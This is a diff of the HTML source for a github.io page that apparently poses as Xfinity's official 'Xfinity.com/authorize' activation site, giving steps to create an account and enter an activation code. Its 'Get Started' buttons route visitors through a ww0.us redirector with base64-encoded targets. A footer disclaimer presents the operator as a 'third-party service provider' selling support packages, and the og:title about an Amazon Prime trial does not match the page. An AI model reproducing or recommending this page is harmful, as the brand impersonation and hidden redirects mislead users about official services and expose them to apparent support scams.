@@ -12,147 +12,266 @@
   <meta property="og:title" content="Sign Up for Amazon Prime Video Free Trial : Stream for a Month for Free">
   <meta property="og:description" content="Xfinity.com/authorize is where you activate the Xfinity Stream app by entering an activation code. This process enables you to download and install the Xfinity app on your device, allowing access to live TV, on-demand content, and DVR recordings from your Xfinity subscription.">  
   <link rel="icon" type="image/png" href="logo.png">
-  <meta property="og:url" content="https://xfinitycomauthorizeentercode.github.io//">
-  <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      padding: 0;
-      font-family: Georgia, serif;
-    }
+  <meta property="og:url" content="https://xfinitycomauthorizeentercode.github.io/">
+  
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
 
-    body {
-      display: flex;
-      flex-direction: column;
-    }
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
 
-    header {
-      background-color: #000;
-      color: #FFFFFF;
-      padding: 2px;
-      text-align: center;
-      font-size: 10px;
-    }
+        header nav {
+            background-color: #000;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0px 20px;
+        }
 
-    h1 {
-      font-size: 36px;
-      font-weight: bold;
-      color: #FFFFFF;
-    }
+        header .logo {
+            font-size: 1.5rem;
+        }
 
-    h2 {
-      font-size: 24px;
-      font-weight: bold;
-      color: #000000;
-    }
+        header nav label i {
+            color: white;
+            align-items: center;
+            justify-content: center;
+        }
 
-    h3 {
-      font-size: 18px;
-      font-weight: bold;
-      color: #999;
-    }
+        header ul {
+            display: flex;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
 
-   .banner {
-      background-image: linear-gradient(to bottom, #ff0000, #000);
-      height: 100%; 
-      width: 100%; 
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: #fff;
-      font-size: 30px;
-      flex-direction: column;
-      margin: 0 auto;
-    }
-    .banner-content {
-      text-align: center;
-      font-size: 10px;
-    }
+        header ul li {
+            margin-right: 20px;
+        }
 
-    .banner h1 {
-      font-size: 60px; 
-      font-weight: bold;
-      color: #fff;
-      text-shadow: 2px 2px 4px #000;
-    }
+        header ul li a {
+            color: white;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
 
-    .banner p {
-      font-size: 20px; 
-      color: #fff;
-      text-shadow: 2px 2px 4px #000;
-      margin-bottom: 50px;
-      margin-top: 80px;
-    }
+        header ul li a:hover {
+            color: #560d0d;
+        }
 
-    .logo {
-      width: 50px;
-      height: 50px;
-      margin: 2px;
-    }
+        header .checkbtn {
+            font-size: 30px;
+            color: white;
+            cursor: pointer;
+            display: none;
+        }
 
-    main {
-      flex: 1;
-      padding: 20px;
-      margin-top: 30px;
-    }
+        header #check {
+            display: none;
+        }
 
-  a:link {
-  color: #d80000;
-  background-color: transparent;
+        @media (max-width: 768px) {
+            header .checkbtn {
+                display: block;
+                order: 1;
+                margin-right: 20px;
+            }
+
+            header ul {
+                position: fixed;
+                top: 80px;
+                right: -100%;
+                background-color: #D2042D;
+                width: 100%;
+                height: 100vh;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                transition: all 0.3s;
+            }
+
+            header ul li {
+                margin: 20px 0;
+            }
+
+            header ul li a {
+                font-size: 20px;
+            }
+
+            header #check:checked~ul {
+                right: 0;
+            }
+        }
+
+        .container {
+            margin: 20px auto;
+            max-width: 800px;
+            padding: 0 20px;
+        }
+
+        .container h1 {
+            color: #000;
+            font-size:50px;
+        }
+        
+        
+        .container h2 {
+            color: #000;
+            font-size:30px;
+        }
+
+        .container .bg_sectionw, .container .bg_section {
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+        }
+
+        .container .bg_sectionw {
+            background-color: #ffffff;
+        }
+
+        .container .bg_section {
+            background-color: #f5f5f5;
+        }
+
+        /* CSS */
+.button-85 {
+  padding: 1.0em 2em;
+  border: none;
+  outline: none;
+  color: rgb(255, 255, 255);
+  background: #111;
+  cursor: pointer;
+  font-size:16px;
+  position: relative;
+  z-index: 0;
+  border-radius: 10px;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+}
+
+.button-85:before {
+  content: "";
+  background: linear-gradient(
+    45deg,
+    #ff0000,
+    #ff7300,
+    #fffb00,
+    #48ff00,
+    #00ffd5,
+    #002bff,
+    #7a00ff,
+    #ff00c8,
+    #ff0000
+  );
+  position: absolute;
+  top: -2px;
+  left: -2px;
+  background-size: 400%;
+  z-index: -1;
+  filter: blur(5px);
+  -webkit-filter: blur(5px);
+  width: calc(100% + 4px);
+  height: calc(100% + 4px);
+  animation: glowing-button-85 20s linear infinite;
+  transition: opacity 0.3s ease-in-out;
+  border-radius: 10px;
+}
+
+@keyframes glowing-button-85 {
+  0% {
+    background-position: 0 0;
   }
+  50% {
+    background-position: 400% 0;
+  }
+  100% {
+    background-position: 0 0;
+  }
+}
 
-    footer {
-      background-color: #000;
-      color: #fff;
-      padding: 10px;
-      text-align: center;
-    }
+.button-85:after {
+  z-index: -1;
+  content: "";
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background: #222;
+  left: 0;
+  top: 0;
+  border-radius: 10px;
+}
 
-    .button {
-      background-color: #FDFCFC;
-      color: #000000;
-      padding: 20px 40px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-      margin-bottom: 50px;
-      margin-top: 50px;
-    }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #fff;
+        }
 
-    .button:hover {
-      background-color: #3e8e41;
-    }
-  </style>
+        footer p {
+            margin: 0;
+            color: rgb(0, 0, 0);
+            font-weight: 100;
+        }
+    </style>
 </head>
 <body>
-  <header>
-    <img src="logo.png" alt="Logo" class="logo">
-    <!-- <h1 style="color: #FFFFFF;">Xfinity.com/authorize : Connect Canon Printer To Computer</h1> -->
-  </header>
-  <div class="banner">
-    <div class="banner-content">
-      <h1>Xfinity.com/authorize</h1>
-      <p>Xfinity.com/authorize is where you activate the Xfinity Stream app by entering an activation code. </p>     
-      <a href="https://ww0.us?aHR0cHM6Ly94ZmluaXR5Y29tYXV0aG9yaXplZW50ZXJjb2RlLmdpdGh1Yi5pbw==" target="_blank"><button class="button">Get Started Here</button></a>
-        <br>
-    </div>
-  </div>
-  <br>
-  <main>
-    <p>The Xfinity Stream app allows users to stream live TV, on-demand shows, and movies on various devices. It offers access to Xfinity's content library and DVR recordings remotely. To activate, visit <strong><a href="https://xfinitycomauthorizeentercode.github.io/">Xfinity.com/authorize</a></strong>, enter the activation code, and follow the prompts to start enjoying your Xfinity subscription on your preferred device.</p>
 
-    <h2>Sign up for Xfinity Authorize Account</h2>
-    <ol>
+    <!-- header  -->
+    <header>
+        <nav>
+            <input type="checkbox" id="check">
+            <label for="check" class="checkbtn">
+                <i class="fas fa-bars"></i>
+            </label>
+            <div style="display: flex; padding-top: 10px;">
+                <img src="fev.png" alt="Logo" height="50px" width="50px">
+                <h1 style="color: white; margin-top: 5px; margin-left: 10px;">Xfinity.com/authorize</h1>
+            </div>
+            <ul>
+                <li><a class="active" href="#">Home</a></li>
+                <li><a href="#">About</a></li>
+            </ul>
+        </nav>
+    </header>
+    <!-- end header  -->
+
+    <div class="container">
+        <div class="button-container">
+           <center> <h1>Xfinity.com/authorize</h1></center>
+            <center><p>Xfinity.com/authorize is where you activate the Xfinity Stream app by entering an activation code.</p></center>
+            <center><a href="https://ww0.us?aHR0cHM6Ly95dC1iZWFjdGl2YXRlLmdpdGh1Yi5pbw==" class="button"><button class="button-85" role="button">GET STARTED NOW</button></a></center>
+        </div>
+
+    <div class="container">
+        <div class="bg_sectionw">
+            <center>
+                <h2>Welcome to Xfinity Authorize!</h2>
+            </center>
+            <p>The Xfinity Stream app allows users to stream live TV, on-demand shows, and movies on various devices. It offers access to Xfinity's content library and DVR recordings remotely. To activate, visit <strong><a href="https://xfinitycomauthorizeentercode.github.io/">Xfinity.com/authorize</a></strong>, enter the activation code, and follow the prompts to start enjoying your Xfinity subscription on your preferred device.</p>
+        </div>
+
+        <div class="bg_section">
+            <h2>Sign up for Xfinity Authorize Account</h2>
+            <ol>
     <li>Go to <a href="https://xfinitycomauthorizeentercode.github.io/">Xfinity.com/authorize</a>.</li>
     <li>Click on the tab - <strong>"Create xfinity account"</strong>.</li>
     <li>Provide username, email id, password, etc.</li>
     <li>Click on <strong>"Create account"</strong>.</li>
    <li> Once the xfinity account is created successfully, sign in using credentials.</li>
     </ol>
+        </div>
 
-<h2>How to Download and Install Xfinity App?</h2>
-    <ol>
+        <div class="bg_sectionw">
+           <h2>How to Download and Install Xfinity App?</h2>
+            <ol>
     <li>Visit the respective app store of your iOS device or Android device.</li>
     <li>Use the search bar to find the official Xfinity app.</li>
     <li>Once you find the Xfinity app, tap on it, then tap the "Download" or "Install" button.</li>
@@ -165,10 +284,19 @@
     <li>Follow any prompts in the app to enter the activation code shown on your screen.</li>
     <li>Enter the code and follow any additional on-screen instructions to complete the activation process.</li>
     </ol>
+    
+    <p>The Xfinity app allows you to manage your Xfinity services, pay bills, troubleshoot, and more, depending on your <strong><a href="https://xfinitycomauthorizeentercode.github.io/">Xfinity.com/authorize</a></strong> subscription and services.</p>
+        </div>
 
-<br>
-<p><strong>The Xfinity app allows you to manage your Xfinity services, pay bills, troubleshoot, and more, depending on your <a href="https://xfinitycomauthorizeentercode.github.io/">Xfinity.com/authorize</a> subscription and services.</strong></p>
+        <footer>
+            <div class="text-center" style="margin-top: 20px;">
+                <center>
+                    <p><strong style="color: rgb(0, 0, 0); font-weight:100;">Disclaimer:</strong> This website is not associated with Xfinity authorize or any other services. We are an independent or third-party service provider providing support with our service packages.</p>
+                </center>
 
-   <p><strong>Disclaimer</strong> This website is not associated with Xfinity authorize or any other services. We are an independent or third-party service provider providing support with our service packages. </p>
+            </div>
+        </footer>
+    </div>
 </body>
+
 </html>
